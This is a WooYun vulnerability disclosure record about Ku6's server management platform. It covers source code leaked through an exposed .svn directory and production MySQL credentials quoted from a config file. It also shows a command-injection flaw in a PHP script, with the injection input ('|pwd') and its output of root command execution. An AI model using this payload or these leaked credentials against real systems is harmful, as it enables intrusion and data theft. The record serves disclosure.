{"id": 48294, "wybug_id": "wooyun-2014-088879", "wybug_title": "酷6网服务器统一管理平台源码泄露（进而引发命令执行漏洞）", "wybug_corp": "酷6网", "wybug_author": "路人甲", "wybug_date": "2014-12-27 02:00", "wybug_open_date": "2015-01-01 02:02", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 酷6网服务器统一管理平台源码泄露（进而引发命令执行漏洞） 详细说明：  可直接下载整站源码http://fixedassets.ku6.cn/.svn/entries\n\n进行源码分析发现这是一台非常敏感的服务器，配置服务器用的\nfunction server_group_assign()\t//批量分配服务器\t{\t\trequire './inc_check_permit.php';\t\tif (!isPermitted(\"server_op\"))\t\t{\t\t\t$this->window_alert(\"无此操作权限\");\t\t\treturn false;\t\t}\t\t$fixed = __post('fixed');\t\tif(empty($fixed)){\t\t\t$this->window_alert('请选择你要分配的服务器！');\t\t\treturn false;\t\t}\t\t$server_array = array();\t\t//var_dump($fixed);exit();\t\tforeach($fixed as $k=>$v){\t\t\t$server_id = $k;\t\t\t$server_array[] = $k;\t\t\t$business_id = $v['business_id'];\t\t\t$this->validate($business_id, 'not_zero', null, '编号为【'.$k.'】的服务器：业务必须填写');\t\t\t$sub_business_id = $v['sub_business_id'];\t\t\t$this->validate($sub_business_id, 'not_zero', null, '编号为【'.$k.'】的服务器：子业务必须填写');\t\t\t$depart = $v['depart'];\t\t\t$this->validate($depart, 'not_zero', null, '编号为【'.$k.'】的服务器：所属部门必须填写');\t\t\t$person = $v['person'];\t\t\t$this->validate($person, 'not_zero', null, '编号为【'.$k.'】的服务器：所属部门责任人必须填写');\t\t\t$supporter = $v['supporter'];\t\t\t$this->validate($supporter, 'not_zero', null, '编号为【'.$k.'】的服务器：联系人必须填写');\t\t\t$backup_supporter = $v['backup_supporter'];\t\t\t$this->validate($backup_supporter, 'not_zero', null, '编号为【'.$k.'】的服务器：备份联系人必须填写');\t\t}\n#3 某附件直接存放了生产服务器的密码\n\nhttp://fixedassets.ku6.cn/config_check_list.php 各种敏感信息\n$res = real_mysql_query($sql, '125.76.238.232', 'itil', 'Itil', 'storage_cluster', 3306);$res = real_mysql_query($sql, '203.187.170.74', 'root', 'dogoicq', 'itil', 3305);\n# 代码执行漏洞在这里CdnDeleveMdfy.php\n<?#＃＃＃＃生效$cdnid=$_GET['cdnid'];if ($_GET['reload']){\t$OK1=`curl -is \"http://59.151.119.26:8080/cmd/4?cdnid=$cdnid\"`;\techo nl2br($OK1);}?>\n传入 reload=1 & cdnid=99999\"|pwd 就执行命令了   漏洞证明：  \n$uname -aLinux server.oss.com 2.6.18-128.el5 #1 SMP Wed Jan 21 10:41:14 EST 2009 x86_64$pwd/data/WWW/itil/htdocs$whoamiroot\n   修复方案：  更改配置   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-01 02:02 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}